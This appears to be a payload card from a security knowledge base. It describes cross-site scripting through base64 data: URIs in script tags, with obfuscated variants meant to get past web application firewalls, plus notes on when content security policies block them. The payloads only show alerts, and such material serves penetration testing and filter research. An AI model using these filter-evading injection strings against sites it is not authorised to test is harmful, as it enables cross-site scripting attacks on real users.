---
title: Base64 data: URI in Script src
slug: base64-data-uri-script
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [payload, sink/dom-xss, sink/script-src, sink/waf-bypass]
inbound: []
---

# Base64 data: URI in Script src

## Payload

```html
<script src=data:text/javascript;base64,YWxlcnQoMSk=></script>
```

## Variants

```html
<!-- Base64 + HTML entities -->
<script src=data:text/javascript;base64,&#x59;&#x57;&#x78;&#x6c;&#x63;&#x6e;&#x51;&#x6f;&#x4d;&#x53;&#x6b;&#x3d;></script>

<!-- Base64 + URL encoding -->
<script src=data:text/javascript;base64,%59%57%78%6c%63%6e%51%6f%4d%53%6b%3d></script>

<!-- Plain data: URI (no base64) -->
<script src="data:text/javascript,alert(1)"></script>

<!-- import() with data URL -->
<script>import('data:text/javascript,alert(1)')</script>

<!-- atob template literal (WAF bypass via img onerror) -->
<img src=x onerror=location=atob`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p`>
```

## Context

`data:` URIs in `<script src>` execute inline JS without a network request, bypassing origin-based WAF inspection. `YWxlcnQoMSk=` decodes to `alert(1)`. The HTML-entity and URL-encoded variants obfuscate the base64 string itself. The `import()` form works in ES-module contexts where `<script src>` is blocked. The `atob` template literal form redirects `location` to a `javascript:` URI decoded from base64. Note: `data:` in `<script src>` is blocked by most CSPs (`script-src 'self'` or nonce); effective only when no CSP or CSP allows `data:`.

## Provenance

- Distilled from: `../../techniques/dom-xss/waf-bypass.md`
- Original source: `../../sources/portswigger-xss-cheatsheet.md`

## Linked techniques

- [WAF Bypass and Obfuscation](../../techniques/dom-xss/waf-bypass.md)
